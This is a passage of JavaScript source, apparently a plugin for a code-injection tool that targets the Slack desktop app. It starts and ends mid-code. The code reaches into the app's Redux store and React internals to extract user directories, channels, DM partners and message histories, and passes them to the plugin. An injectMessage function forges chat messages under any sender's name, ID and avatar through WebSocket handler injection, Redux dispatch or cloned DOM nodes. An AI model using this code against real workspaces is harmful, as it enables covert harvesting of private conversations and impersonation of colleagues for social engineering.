            plugin.sendData('_debug', { fn: 'findStoreInWindow', windowId: windowId, storePath: null, note: 'No Redux store found in window' });
        }
        return path;
    }).catch(function(e) {
        plugin.sendData('_debug', { fn: 'findStoreInWindow', windowId: windowId, error: String(e) });
        return null;
    });
}

// Helper: resolve a store path in renderer code.
// For React fiber paths, we need special accessor code since we can't cache the fiber reference directly.
function storeAccessCode(storePath) {
    if (storePath === '__reactFiber_store') {
        return '(function() {' +
            '  var root = document.querySelector("#app") || document.querySelector("#root") || document.querySelector("[data-reactroot]");' +
            '  if (!root) return null;' +
            '  var fiberKey = Object.keys(root).find(function(k) { return k.indexOf("__reactFiber") === 0 || k.indexOf("__reactInternalInstance") === 0; });' +
            '  if (!fiberKey) return null;' +
            '  var fiber = root[fiberKey];' +
            '  var depth = 0;' +
            '  while (fiber && depth < 50) {' +
            '    if (fiber.memoizedProps && fiber.memoizedProps.store && typeof fiber.memoizedProps.store.getState === "function") return fiber.memoizedProps.store;' +
            '    fiber = fiber.return; depth++;' +
            '  }' +
            '  return null;' +
            '})()';
    }
    if (storePath === '__reactFiber_stateNode_store') {
        return '(function() {' +
            '  var root = document.querySelector("#app") || document.querySelector("#root") || document.querySelector("[data-reactroot]");' +
            '  if (!root) return null;' +
            '  var fiberKey = Object.keys(root).find(function(k) { return k.indexOf("__reactFiber") === 0 || k.indexOf("__reactInternalInstance") === 0; });' +
            '  if (!fiberKey) return null;' +
            '  var fiber = root[fiberKey];' +
            '  var depth = 0;' +
            '  while (fiber && depth < 50) {' +
            '    if (fiber.stateNode && fiber.stateNode.store && typeof fiber.stateNode.store.getState === "function") return fiber.stateNode.store;' +
            '    fiber = fiber.return; depth++;' +
            '  }' +
            '  return null;' +
            '})()';
    }
    // Simple global path like "window.store"
    return storePath;
}

function fetchUsersLocal(windowId) {
    return findStoreInWindow(windowId).then(function(storePath) {
        if (!storePath) {
            plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'skip', reason: 'no store found' });
            return false;
        }

        var accessor = storeAccessCode(storePath);
        var code =
            '(function() {' +
            '  var diag = { storeOk: false, stateKeys: [], userPathHit: -1, userKeysSample: [], userCount: 0, error: null };' +
            '  try {' +
            '    var store = ' + accessor + ';' +
            '    if (!store || typeof store.getState !== "function") { diag.error = "store not accessible"; return JSON.stringify({ diag: diag }); }' +
            '    diag.storeOk = true;' +
            '    var state = store.getState();' +
            '    if (!state) { diag.error = "state is null"; return JSON.stringify({ diag: diag }); }' +
            '    diag.stateKeys = Object.keys(state).slice(0, 40);' +
            '' +
            // Scan for user-like data in common Slack store locations
            '    var userEntities = null;' +
            '    var paths = [' +
            '      function(s) { return s.users && s.users.entities; },' +
            '      function(s) { return s.users; },' +
            '      function(s) { return s.members && s.members.entities; },' +
            '      function(s) { return s.members; },' +
            '      function(s) { if (s.entities && s.entities.users) return s.entities.users; },' +
            '      function(s) { var k = Object.keys(s); for (var i = 0; i < k.length; i++) { var v = s[k[i]]; if (v && typeof v === "object" && !Array.isArray(v)) { var sk = Object.keys(v); if (sk.length > 0 && sk[0].match && sk[0].match(/^U[A-Z0-9]{4,}$/)) return v; } } return null; }' +
            '    ];' +
            '    for (var p = 0; p < paths.length; p++) {' +
            '      try {' +
            '        var u = paths[p](state);' +
            '        if (u && typeof u === "object" && !Array.isArray(u)) {' +
            '          var testKeys = Object.keys(u);' +
            '          if (testKeys.length > 0 && testKeys[0].match && testKeys[0].match(/^U[A-Z0-9]{4,}$/)) {' +
            '            userEntities = u; diag.userPathHit = p; diag.userKeysSample = testKeys.slice(0, 5); break;' +
            '          }' +
            '        }' +
            '      } catch(e) {}' +
            '    }' +
            '    if (!userEntities) {' +
            // Extra diag: peek at state.users to see what shape it has
            '      try {' +
            '        if (state.users) {' +
            '          diag.usersType = typeof state.users;' +
            '          diag.usersIsArray = Array.isArray(state.users);' +
            '          if (typeof state.users === "object") {' +
            '            diag.usersKeys = Object.keys(state.users).slice(0, 10);' +
            '            var firstKey = diag.usersKeys[0];' +
            '            if (firstKey && state.users[firstKey]) {' +
            '              diag.usersFirstValueType = typeof state.users[firstKey];' +
            '              if (typeof state.users[firstKey] === "object") diag.usersFirstValueKeys = Object.keys(state.users[firstKey]).slice(0, 10);' +
            '            }' +
            '          }' +
            '        }' +
            '        if (state.members) {' +
            '          diag.membersType = typeof state.members;' +
            '          if (typeof state.members === "object") diag.membersKeys = Object.keys(state.members).slice(0, 10);' +
            '        }' +
            '      } catch(e) {}' +
            '      diag.error = "no user entities found";' +
            '      return JSON.stringify({ diag: diag });' +
            '    }' +
            '' +
            '    var users = [];' +
            '    var keys = Object.keys(userEntities);' +
            '    for (var i = 0; i < keys.length; i++) {' +
            '      var m = userEntities[keys[i]];' +
            '      if (!m || !m.id) continue;' +
            '      users.push({' +
            '        id: m.id,' +
            '        name: m.name || "",' +
            '        realName: (m.profile && m.profile.real_name) || m.real_name || "",' +
            '        avatar48: (m.profile && m.profile.image_48) || "",' +
            '        avatar72: (m.profile && m.profile.image_72) || "",' +
            '        isBot: m.is_bot || false,' +
            '        deleted: m.deleted || false' +
            '      });' +
            '    }' +
            '    diag.userCount = users.length;' +
            '    if (users.length === 0) { diag.error = "entities found but no valid users"; return JSON.stringify({ diag: diag }); }' +
            '    return JSON.stringify({ users: users, diag: diag });' +
            '  } catch(e) { diag.error = String(e); return JSON.stringify({ diag: diag }); }' +
            '})()';

        return plugin.executeInRenderer(windowId, code).then(function(raw) {
            if (!raw) {
                plugin.sendData('_debug', { fn: 'fetchUsersLocal', status: 'fail', reason: 'executeInRenderer returned null/empty' });
                return false;
            }
            try {
                var result = JSON.parse(raw);
                // Always send diagnostics
                plugin.sendData('_debug', { fn: 'fetchUsersLocal', diag: result.diag });
                if (!result.users) return false;
                var users = result.users;
                if (!Array.isArray(users) || users.length === 0) return false;

                // Populate userMap (same as fetchUsers does)
                for (var i = 0; i < users.length; i++) {
                    var u = users[i];
                    userMap[u.id] = {
                        name: u.name,
                        realName: u.realName,
                        avatar48: u.avatar48,
                        avatar72: u.avatar72
                    };
                }
                plugin.sendData('user_list', { users: users, count: users.length, source: 'local' });
                return true;
            } catch (e) {
                return false;
            }
        }).catch(function() { return false; });
    });
}

function fetchChannelsLocal(windowId) {
    return findStoreInWindow(windowId).then(function(storePath) {
        if (!storePath) {
            plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'skip', reason: 'no store found' });
            return false;
        }

        var accessor = storeAccessCode(storePath);
        var code =
            '(function() {' +
            '  var diag = { channelPathHit: -1, channelKeysSample: [], channelCount: 0, error: null };' +
            '  try {' +
            '    var store = ' + accessor + ';' +
            '    if (!store || typeof store.getState !== "function") { diag.error = "store not accessible"; return JSON.stringify({ diag: diag }); }' +
            '    var state = store.getState();' +
            '    if (!state) { diag.error = "state is null"; return JSON.stringify({ diag: diag }); }' +
            '' +
            // Scan for channel-like data
            '    var channelEntities = null;' +
            '    var paths = [' +
            '      function(s) { return s.channels && s.channels.entities; },' +
            '      function(s) { return s.channels; },' +
            '      function(s) { return s.conversations && s.conversations.entities; },' +
            '      function(s) { return s.conversations; },' +
            '      function(s) { if (s.entities && s.entities.channels) return s.entities.channels; },' +
            '      function(s) { if (s.entities && s.entities.conversations) return s.entities.conversations; },' +
            '      function(s) { var k = Object.keys(s); for (var i = 0; i < k.length; i++) { var v = s[k[i]]; if (v && typeof v === "object" && !Array.isArray(v)) { var sk = Object.keys(v); if (sk.length > 0 && sk[0].match && sk[0].match(/^[CDG][A-Z0-9]{4,}$/)) return v; } } return null; }' +
            '    ];' +
            '    for (var p = 0; p < paths.length; p++) {' +
            '      try { var c = paths[p](state); if (c && typeof c === "object" && !Array.isArray(c)) { var testKeys = Object.keys(c); if (testKeys.length > 0 && testKeys[0].match && testKeys[0].match(/^[CDG][A-Z0-9]{4,}$/)) { channelEntities = c; diag.channelPathHit = p; diag.channelKeysSample = testKeys.slice(0, 5); break; } } } catch(e) {}' +
            '    }' +
            '    if (!channelEntities) {' +
            '      try {' +
            '        if (state.channels) { diag.channelsType = typeof state.channels; if (typeof state.channels === "object") diag.channelsKeys = Object.keys(state.channels).slice(0, 10); }' +
            '        if (state.conversations) { diag.conversationsType = typeof state.conversations; if (typeof state.conversations === "object") diag.conversationsKeys = Object.keys(state.conversations).slice(0, 10); }' +
            '      } catch(e) {}' +
            '      diag.error = "no channel entities found";' +
            '      return JSON.stringify({ diag: diag });' +
            '    }' +
            '' +
            // Also get user entities for DM name resolution
            '    var userEntities = null;' +
            '    var uPaths = [' +
            '      function(s) { return s.users && s.users.entities; },' +
            '      function(s) { return s.users; },' +
            '      function(s) { return s.members && s.members.entities; },' +
            '      function(s) { return s.members; },' +
            '      function(s) { if (s.entities && s.entities.users) return s.entities.users; }' +
            '    ];' +
            '    for (var up = 0; up < uPaths.length; up++) {' +
            '      try { var u = uPaths[up](state); if (u && typeof u === "object" && !Array.isArray(u)) { var tk = Object.keys(u); if (tk.length > 0 && tk[0].match && tk[0].match(/^U[A-Z0-9]{4,}$/)) { userEntities = u; break; } } } catch(e) {}' +
            '    }' +
            '' +
            '    var channels = [];' +
            '    var keys = Object.keys(channelEntities);' +
            '    for (var i = 0; i < keys.length; i++) {' +
            '      var ch = channelEntities[keys[i]];' +
            '      if (!ch || !ch.id) continue;' +
            '      var displayName = ch.name || "";' +
            '      var chType = "public";' +
            '      if (ch.is_im) {' +
            '        chType = "im";' +
            '        if (ch.user && userEntities && userEntities[ch.user]) {' +
            '          displayName = "@" + (userEntities[ch.user].name || ch.user);' +
            '        } else if (ch.user) {' +
            '          displayName = "@" + ch.user;' +
            '        }' +
            '      } else if (ch.is_mpim) { chType = "mpim"; }' +
            '      else if (ch.is_private || ch.is_group) { chType = "private"; }' +
            '      channels.push({' +
            '        id: ch.id,' +
            '        name: displayName,' +
            '        type: chType,' +
            '        memberCount: ch.num_members || 0,' +
            '        topic: (ch.topic && (typeof ch.topic === "string" ? ch.topic : ch.topic.value)) || "",' +
            '        purpose: (ch.purpose && (typeof ch.purpose === "string" ? ch.purpose : ch.purpose.value)) || "",' +
            '        isArchived: ch.is_archived || false' +
            '      });' +
            '    }' +
            '    diag.channelCount = channels.length;' +
            '    if (channels.length === 0) { diag.error = "entities found but no valid channels"; return JSON.stringify({ diag: diag }); }' +
            '    return JSON.stringify({ channels: channels, diag: diag });' +
            '  } catch(e) { diag.error = String(e); return JSON.stringify({ diag: diag }); }' +
            '})()';

        return plugin.executeInRenderer(windowId, code).then(function(raw) {
            if (!raw) {
                plugin.sendData('_debug', { fn: 'fetchChannelsLocal', status: 'fail', reason: 'executeInRenderer returned null/empty' });
                return false;
            }
            try {
                var result = JSON.parse(raw);
                plugin.sendData('_debug', { fn: 'fetchChannelsLocal', diag: result.diag });
                if (!result.channels) return false;
                var channels = result.channels;
                if (!Array.isArray(channels) || channels.length === 0) return false;

                // Resolve DM names from our userMap (in case store didn't have user data)
                for (var i = 0; i < channels.length; i++) {
                    if (channels[i].type === 'im' && channels[i].name.charAt(0) === '@') {
                        var uid = channels[i].name.substring(1);
                        if (uid.match(/^U[A-Z0-9]+$/) && userMap[uid]) {
                            channels[i].name = '@' + userMap[uid].name;
                        }
                    }
                }

                plugin.sendData('channel_list', { channels: channels, count: channels.length, source: 'local' });
                return true;
            } catch (e) {
                return false;
            }
        }).catch(function() { return false; });
    });
}

function fetchMessagesLocal(windowId, channelId, channelName) {
    return findStoreInWindow(windowId).then(function(storePath) {
        if (!storePath) {
            plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'skip', reason: 'no store found', channelId: channelId });
            return false;
        }

        var accessor = storeAccessCode(storePath);
        var safeChannelId = JSON.stringify(channelId);
        var code =
            '(function() {' +
            '  var diag = { msgPathHit: -1, msgCount: 0, error: null };' +
            '  try {' +
            '    var store = ' + accessor + ';' +
            '    if (!store || typeof store.getState !== "function") { diag.error = "store not accessible"; return JSON.stringify({ diag: diag }); }' +
            '    var state = store.getState();' +
            '    if (!state) { diag.error = "state is null"; return JSON.stringify({ diag: diag }); }' +
            '    var channelId = ' + safeChannelId + ';' +
            '' +
            // Find messages for the specific channel
            '    var msgs = null;' +
            '    var paths = [' +
            '      function(s) { return s.messages && s.messages[channelId]; },' +
            '      function(s) { return s.messages && s.messages.entities && s.messages.entities[channelId]; },' +
            '      function(s) { return s.conversations && s.conversations[channelId] && s.conversations[channelId].messages; },' +
            '      function(s) { if (s.entities && s.entities.messages && s.entities.messages[channelId]) return s.entities.messages[channelId]; },' +
            // Deep scan for message-like objects keyed by channel
            '      function(s) { var k = Object.keys(s); for (var i = 0; i < k.length; i++) { var v = s[k[i]]; if (v && typeof v === "object" && v[channelId]) { var cv = v[channelId]; if (Array.isArray(cv) && cv.length > 0 && cv[0].ts) return cv; if (typeof cv === "object" && !Array.isArray(cv)) { var msgs = cv.messages || cv.items; if (Array.isArray(msgs)) return msgs; var mk = Object.keys(cv); var arr = []; for (var j = 0; j < mk.length; j++) { if (cv[mk[j]] && cv[mk[j]].ts) arr.push(cv[mk[j]]); } if (arr.length > 0) return arr; } } } return null; }' +
            '    ];' +
            '    for (var p = 0; p < paths.length; p++) {' +
            '      try {' +
            '        var m = paths[p](state);' +
            '        if (m) {' +
            '          if (Array.isArray(m) && m.length > 0 && m[0].ts) { msgs = m; diag.msgPathHit = p; break; }' +
            '          if (typeof m === "object" && !Array.isArray(m)) {' +
            '            var mk = Object.keys(m); var arr = [];' +
            '            for (var j = 0; j < mk.length; j++) { if (m[mk[j]] && m[mk[j]].ts) arr.push(m[mk[j]]); }' +
            '            if (arr.length > 0) { msgs = arr; diag.msgPathHit = p; break; }' +
            '          }' +
            '        }' +
            '      } catch(e) {}' +
            '    }' +
            '    if (!msgs || msgs.length === 0) {' +
            '      try {' +
            '        if (state.messages) { diag.messagesType = typeof state.messages; if (typeof state.messages === "object") { diag.messagesKeys = Object.keys(state.messages).slice(0, 10); diag.messagesHasChannel = !!state.messages[channelId]; } }' +
            '      } catch(e) {}' +
            '      diag.error = "no messages found for channel";' +
            '      return JSON.stringify({ diag: diag });' +
            '    }' +
            '' +
            // Get user entities for mention resolution
            '    var userEntities = null;' +
            '    var uPaths = [' +
            '      function(s) { return s.users && s.users.entities; },' +
            '      function(s) { return s.users; },' +
            '      function(s) { return s.members && s.members.entities; },' +
            '      function(s) { return s.members; },' +
            '      function(s) { if (s.entities && s.entities.users) return s.entities.users; }' +
            '    ];' +
            '    for (var up = 0; up < uPaths.length; up++) {' +
            '      try { var u = uPaths[up](state); if (u && typeof u === "object" && !Array.isArray(u)) { var tk = Object.keys(u); if (tk.length > 0 && tk[0].match && tk[0].match(/^U[A-Z0-9]{4,}$/)) { userEntities = u; break; } } } catch(e) {}' +
            '    }' +
            '' +
            // Sort by ts ascending
            '    msgs.sort(function(a, b) { return parseFloat(a.ts) - parseFloat(b.ts); });' +
            '' +
            '    var formatted = [];' +
            '    for (var i = 0; i < msgs.length; i++) {' +
            '      var msg = msgs[i];' +
            '      var userId = msg.user || "";' +
            '      var userName = userId;' +
            '      if (userEntities && userEntities[userId]) userName = userEntities[userId].name || userId;' +
            '      var text = msg.text || "";' +
            '      if (userEntities) {' +
            '        text = text.replace(/<@(U[A-Z0-9]+)>/g, function(match, uid) {' +
            '          return "@" + (userEntities[uid] ? userEntities[uid].name || uid : uid);' +
            '        });' +
            '      }' +
            '      formatted.push({' +
            '        user: userName,' +
            '        userId: userId,' +
            '        text: text,' +
            '        ts: msg.ts,' +
            '        subtype: msg.subtype || "",' +
            '        time: new Date(parseFloat(msg.ts) * 1000).toISOString()' +
            '      });' +
            '    }' +
            '    diag.msgCount = formatted.length;' +
            '    return JSON.stringify({ messages: formatted, diag: diag });' +
            '  } catch(e) { diag.error = String(e); return JSON.stringify({ diag: diag }); }' +
            '})()';

        return plugin.executeInRenderer(windowId, code).then(function(raw) {
            if (!raw) {
                plugin.sendData('_debug', { fn: 'fetchMessagesLocal', status: 'fail', reason: 'executeInRenderer returned null/empty', channelId: channelId });
                return false;
            }
            try {
                var result = JSON.parse(raw);
                plugin.sendData('_debug', { fn: 'fetchMessagesLocal', channelId: channelId, diag: result.diag });
                if (!result.messages) return false;
                var formatted = result.messages;
                if (!Array.isArray(formatted) || formatted.length === 0) return false;

                // Resolve user names from our userMap as fallback
                for (var i = 0; i < formatted.length; i++) {
                    var uid = formatted[i].userId;
                    if (uid && userMap[uid] && formatted[i].user === uid) {
                        formatted[i].user = userMap[uid].name;
                    }
                    // Also resolve mentions using our userMap
                    formatted[i].text = formatted[i].text.replace(/<@(U[A-Z0-9]+)>/g, function(match, muid) {
                        var mu = userMap[muid];
                        return '@' + (mu ? mu.name : muid);
                    });
                }

                plugin.sendData('messages', {
                    channelId: channelId,
                    channelName: channelName || channelId,
                    messages: formatted,
                    count: formatted.length,
                    source: 'local'
                });
                return true;
            } catch (e) {
                return false;
            }
        }).catch(function() { return false; });
    });
}

function probeStore() {
    var windows = plugin.getWindows();
    if (windows.length === 0) {
        plugin.sendData('store_probe', { storeFound: false, storeLocation: null, stateKeys: [], sampleMessage: null, userSample: null, error: 'No windows' });
        return;
    }

    return findWorkspaceWindow().then(function(targetWindowId) {
    var windowId = targetWindowId || windows[0].id;
    var code =
        '(function() {' +
        '  var result = { storeFound: false, storeLocation: null, stateKeys: [], sampleMessage: null, userSample: null };' +
        '  var store = null;' +
        // Strategy 1: well-known globals
        '  var globals = ["__REDUX_STORE__", "store", "__store", "reduxStore", "__NEXT_REDUX_STORE__"];' +
        '  for (var i = 0; i < globals.length; i++) {' +
        '    try {' +
        '      if (window[globals[i]] && typeof window[globals[i]].getState === "function") {' +
        '        store = window[globals[i]];' +
        '        result.storeLocation = "window." + globals[i];' +
        '        break;' +
        '      }' +
        '    } catch(e) {}' +
        '  }' +
        // Strategy 2: React fiber tree
        '  if (!store) {' +
        '    try {' +
        '      var root = document.querySelector("#app") || document.querySelector("#root") || document.querySelector("[data-reactroot]");' +
        '      if (root) {' +
        '        var fiberKey = Object.keys(root).find(function(k) { return k.indexOf("__reactFiber") === 0 || k.indexOf("__reactInternalInstance") === 0; });' +
        '        if (fiberKey) {' +
        '          var fiber = root[fiberKey];' +
        '          var depth = 0;' +
        '          while (fiber && depth < 50) {' +
        '            try {' +
        '              if (fiber.memoizedProps && fiber.memoizedProps.store && typeof fiber.memoizedProps.store.getState === "function") {' +
        '                store = fiber.memoizedProps.store;' +
        '                result.storeLocation = "reactFiber.memoizedProps.store";' +
        '                break;' +
        '              }' +
        '              if (fiber.stateNode && fiber.stateNode.store && typeof fiber.stateNode.store.getState === "function") {' +
        '                store = fiber.stateNode.store;' +
        '                result.storeLocation = "reactFiber.stateNode.store";' +
        '                break;' +
        '              }' +
        '            } catch(e) {}' +
        '            fiber = fiber.return;' +
        '            depth++;' +
        '          }' +
        '        }' +
        '      }' +
        '    } catch(e) {}' +
        '  }' +
        // Strategy 3: window key scan
        '  if (!store) {' +
        '    try {' +
        '      var keys = Object.keys(window);' +
        '      for (var k = 0; k < keys.length; k++) {' +
        '        try {' +
        '          var v = window[keys[k]];' +
        '          if (v && typeof v === "object" && typeof v.getState === "function" && typeof v.dispatch === "function") {' +
        '            store = v;' +
        '            result.storeLocation = "window." + keys[k];' +
        '            break;' +
        '          }' +
        '        } catch(e) {}' +
        '      }' +
        '    } catch(e) {}' +
        '  }' +
        '  if (store) {' +
        '    result.storeFound = true;' +
        '    try {' +
        '      var state = store.getState();' +
        '      result.stateKeys = Object.keys(state).slice(0, 30);' +
        // Try to find a sample message
        '      function findMessages(obj, depth) {' +
        '        if (depth > 3 || !obj) return null;' +
        '        if (Array.isArray(obj)) {' +
        '          for (var i = 0; i < Math.min(obj.length, 5); i++) {' +
        '            if (obj[i] && obj[i].text && obj[i].ts && obj[i].user) return obj[i];' +
        '          }' +
        '        }' +
        '        if (typeof obj === "object") {' +
        '          var okeys = Object.keys(obj).slice(0, 20);' +
        '          for (var j = 0; j < okeys.length; j++) {' +
        '            var r = findMessages(obj[okeys[j]], depth + 1);' +
        '            if (r) return r;' +
        '          }' +
        '        }' +
        '        return null;' +
        '      }' +
        '      var msg = findMessages(state, 0);' +
        '      if (msg) result.sampleMessage = { type: msg.type, user: msg.user, text: (msg.text || "").substring(0, 100), ts: msg.ts, channel: msg.channel, team: msg.team };' +
        // Try to find a sample user entity
        '      function findUser(obj, depth) {' +
        '        if (depth > 3 || !obj) return null;' +
        '        if (typeof obj === "object" && !Array.isArray(obj)) {' +
        '          if (obj.name && obj.id && (obj.id + "").indexOf("U") === 0) return { id: obj.id, name: obj.name, real_name: obj.real_name };' +
        '          var okeys = Object.keys(obj).slice(0, 20);' +
        '          for (var j = 0; j < okeys.length; j++) {' +
        '            var r = findUser(obj[okeys[j]], depth + 1);' +
        '            if (r) return r;' +
        '          }' +
        '        }' +
        '        return null;' +
        '      }' +
        '      result.userSample = findUser(state, 0);' +
        '    } catch(e) { result.error = String(e); }' +
        '  }' +
        '  return JSON.stringify(result);' +
        '})()';

    return plugin.executeInRenderer(windowId, code).then(function(raw) {
        try {
            var data = JSON.parse(raw);
            plugin.sendData('store_probe', data);
        } catch (e) {
            plugin.sendData('store_probe', { storeFound: false, storeLocation: null, stateKeys: [], sampleMessage: null, userSample: null, error: 'Parse error: ' + String(e) });
        }
    }).catch(function(e) {
        plugin.sendData('store_probe', { storeFound: false, storeLocation: null, stateKeys: [], sampleMessage: null, userSample: null, error: String(e) });
    });
    }); // findWorkspaceWindow
}

function injectMessage(channelId, senderId, text, senderName) {
    var windows = plugin.getWindows();
    if (windows.length === 0) {
        plugin.sendData('inject_result', { channelId: channelId, strategy: 'none', success: false, error: 'No windows' });
        return;
    }

    return findWorkspaceWindow().then(function(targetWindowId) {
    var windowId = targetWindowId || windows[0].id;
    // Ensure WS interceptor is installed on the target window
    plugin.executeInRenderer(windowId, wsInterceptorCode);
    var safeText = JSON.stringify(text || '');
    var safeName = JSON.stringify(senderName || 'Unknown');
    var safeSenderId = JSON.stringify(senderId || 'U00000000');
    var safeChannelId = JSON.stringify(channelId || '');

    var code =
        '(function() {' +
        '  var channelId = ' + safeChannelId + ';' +
        '  var senderId = ' + safeSenderId + ';' +
        '  var text = ' + safeText + ';' +
        '  var senderName = ' + safeName + ';' +
        '  var fakeTs = String(Date.now() / 1000);' +
        '  var result = { channelId: channelId, ts: fakeTs, strategy: "none", success: false, error: null, wsDebug: null };' +
        '' +
        // Strategy 0: WebSocket injection — find live WS and push a fake message through it
        '  var openWs = null;' +
        // Try captured WS first
        '  if (window.__JSTAP_WS_CAPTURED && window.__JSTAP_WS_CAPTURED.length > 0) {' +
        '    var wsList = window.__JSTAP_WS_CAPTURED;' +
        '    for (var wi = 0; wi < wsList.length; wi++) {' +
        '      if (wsList[wi].readyState === 1) { openWs = wsList[wi]; break; }' +
        '    }' +
        '  }' +
        // Fallback: scan window properties for live WebSocket instances
        '  if (!openWs) {' +
        '    try {' +
        '      var keys = Object.keys(window);' +
        '      for (var ki = 0; ki < keys.length && !openWs; ki++) {' +
        '        try {' +
        '          var val = window[keys[ki]];' +
        '          if (val instanceof WebSocket && val.readyState === 1) { openWs = val; }' +
        '        } catch(e) {}' +
        '      }' +
        '    } catch(e) {}' +
        '  }' +
        '  if (openWs) {' +
        '    try {' +
        '      var wsMsg = { type: "message", subtype: null, channel: channelId, user: senderId, text: text, ts: fakeTs, team: null };' +
        // Try to extract team ID from boot_data or page state
        '      try {' +
        '        var bd = window.boot_data || (window.TS && TS.boot_data);' +
        '        if (bd && bd.team_id) wsMsg.team = bd.team_id;' +
        '      } catch(e) {}' +
        '      if (!wsMsg.team) {' +
        '        try {' +
        '          var html = document.documentElement.innerHTML;' +
        '          var tm = html.match(/"team_id"\\s*:\\s*"([^"]+)"/);' +
        '          if (tm) wsMsg.team = tm[1];' +
        '        } catch(e) {}' +
        '      }' +
        '      if (wsMsg.team) { wsMsg.source_team = wsMsg.team; wsMsg.user_team = wsMsg.team; }' +
        '      var eventData = JSON.stringify(wsMsg);' +
        '      var msgEvent = new MessageEvent("message", { data: eventData });' +
        // Try onmessage handler first (Slack may set ws.onmessage directly)
        '      if (typeof openWs.onmessage === "function") {' +
        '        openWs.onmessage(msgEvent);' +
        '        result.strategy = "websocket_onmessage";' +
        '        result.success = true;' +
        '      }' +
        // Also try dispatchEvent (for addEventListener-based handlers)
        '      if (!result.success) {' +
        '        try {' +
        '          openWs.dispatchEvent(msgEvent);' +
        '          result.strategy = "websocket_dispatch";' +
        '          result.success = true;' +
        '        } catch(e) {}' +
        '      }' +
        '      result.wsDebug = { wsUrl: (openWs.url||"").substring(0, 80) };' +
        '    } catch(e) { result.error = "ws_inject: " + String(e); }' +
        '  }' +
        '' +
        // Strategy 1: Redux dispatch (fallback)
        '  function findStore() {' +
        '    var globals = ["__REDUX_STORE__", "store", "__store", "reduxStore", "__NEXT_REDUX_STORE__"];' +
        '    for (var i = 0; i < globals.length; i++) {' +
        '      try { if (window[globals[i]] && typeof window[globals[i]].getState === "function") return window[globals[i]]; } catch(e) {}' +
        '    }' +
        '    try {' +
        '      var keys = Object.keys(window);' +
        '      for (var k = 0; k < keys.length; k++) {' +
        '        try {' +
        '          var v = window[keys[k]];' +
        '          if (v && typeof v === "object" && typeof v.getState === "function" && typeof v.dispatch === "function") return v;' +
        '        } catch(e) {}' +
        '      }' +
        '    } catch(e) {}' +
        '    return null;' +
        '  }' +
        '' +
        '  var store = findStore();' +
        '  if (!result.success && store) {' +
        // Try Redux dispatch with multiple action type candidates
        '    try {' +
        '      var fakeMsg = { type: "message", subtype: undefined, user: senderId, text: text, ts: fakeTs, channel: channelId, team: null };' +
        '      try { var st = store.getState(); if (st && st.teams) { var tk = Object.keys(st.teams); if (tk.length) fakeMsg.team = tk[0]; } } catch(e) {}' +
        '      var actionTypes = [' +
        '        "messages/receive",' +
        '        "MESSAGE_RECEIVED",' +
        '        "@@realtime/EVENT_RECEIVED",' +
        '        "realtime/event_received",' +
        '        "RECEIVE_MESSAGE",' +
        '        "messages/add",' +
        '        "@@messages/RECEIVE",' +
        '        "slack/messages/receive"' +
        '      ];' +
        '      var beforeState = null;' +
        '      try { beforeState = JSON.stringify(store.getState()).length; } catch(e) {}' +
        '      var dispatched = false;' +
        '      for (var a = 0; a < actionTypes.length; a++) {' +
        '        try {' +
        '          store.dispatch({ type: actionTypes[a], data: { type: "message", user: senderId, text: text, ts: fakeTs, channel: channelId, team: fakeMsg.team }, message: fakeMsg, payload: fakeMsg });' +
        '          var afterState = null;' +
        '          try { afterState = JSON.stringify(store.getState()).length; } catch(e) {}' +
        '          if (afterState && beforeState && afterState > beforeState) {' +
        '            result.strategy = "redux:" + actionTypes[a];' +
        '            result.success = true;' +
        '            dispatched = true;' +
        '            break;' +
        '          }' +
        '        } catch(e) {}' +
        '      }' +
        '      if (!dispatched) {' +
        // Even if state length didn't change, try the first dispatch anyway — may still render
        '        store.dispatch({ type: "messages/receive", data: { type: "message", user: senderId, text: text, ts: fakeTs, channel: channelId, team: fakeMsg.team }, message: fakeMsg, payload: fakeMsg });' +
        '      }' +
        '    } catch(e) { result.error = "redux: " + String(e); }' +
        '  }' +
        '' +
        // Strategy 2: WebSocket event simulation
        '  if (!result.success) {' +
        '    try {' +
        '      var wsHandlers = window.__SLACK_WS_HANDLERS__ || window.__RTM_HANDLER__;' +
        '      if (wsHandlers && typeof wsHandlers === "function") {' +
        '        wsHandlers({ data: JSON.stringify({ type: "message", user: senderId, text: text, ts: fakeTs, channel: channelId }) });' +
        '        result.strategy = "websocket";' +
        '        result.success = true;' +
        '      }' +
        '    } catch(e) {}' +
        '  }' +
        '' +
        // Strategy 3: DOM clone fallback
        '  if (!result.success) {' +
        '    try {' +
        '      var msgList = document.querySelector("[data-qa=\\"message_list\\"]") || document.querySelector("[data-qa=\\"slack_kit_list\\"]") || document.querySelector(".c-virtual_list__scroll_container") || document.querySelector("[class*=\\"message_pane\\"]");' +
        '      if (!msgList) {' +
        '        var candidates = document.querySelectorAll("[role=\\"list\\"], [role=\\"log\\"], [aria-label*=\\"message\\"], [aria-label*=\\"Message\\"]");' +
        '        if (candidates.length) msgList = candidates[candidates.length - 1];' +
        '      }' +
        '      if (msgList) {' +
        '        var lastMsg = msgList.querySelector("[data-qa=\\"message_container\\"]:last-child") || msgList.lastElementChild;' +
        '        if (lastMsg) {' +
        '          var clone = lastMsg.cloneNode(true);' +
        // Replace text content
        '          var textEl = clone.querySelector("[data-qa=\\"message-text\\"]") || clone.querySelector(".c-message__body") || clone.querySelector("[class*=\\"message_body\\"]");' +
        '          if (textEl) textEl.textContent = text;' +
        '          else { var pEls = clone.querySelectorAll("span, p, div"); if (pEls.length > 2) pEls[pEls.length - 1].textContent = text; }' +
        // Replace sender name
        '          var nameEl = clone.querySelector("[data-qa=\\"message_sender_name\\"]") || clone.querySelector(".c-message__sender") || clone.querySelector("button[data-message-sender]");' +
        '          if (nameEl) nameEl.textContent = senderName;' +
        // Replace avatar
        '          var avatarEl = clone.querySelector("img.c-avatar__image") || clone.querySelector("img[data-qa=\\"message_avatar\\"]") || clone.querySelector("img[src*=\\"avatars\\"]");' +
        '          if (avatarEl && store) {' +
        '            try {' +
        '              var s = store.getState();' +
        '              var ue = (s.users && s.users.entities && s.users.entities[senderId]) || (s.members && s.members[senderId]);' +
        '              if (ue && ue.profile && ue.profile.image_72) avatarEl.src = ue.profile.image_72;' +
        '            } catch(e) {}' +
        '          }' +
        // Replace timestamp
        '          var tsEl = clone.querySelector("[data-qa=\\"message_time\\"]") || clone.querySelector("time") || clone.querySelector(".c-timestamp");' +
        '          if (tsEl) {' +
        '            var now = new Date();' +
        '            tsEl.textContent = now.getHours() + ":" + (now.getMinutes() < 10 ? "0" : "") + now.getMinutes();' +
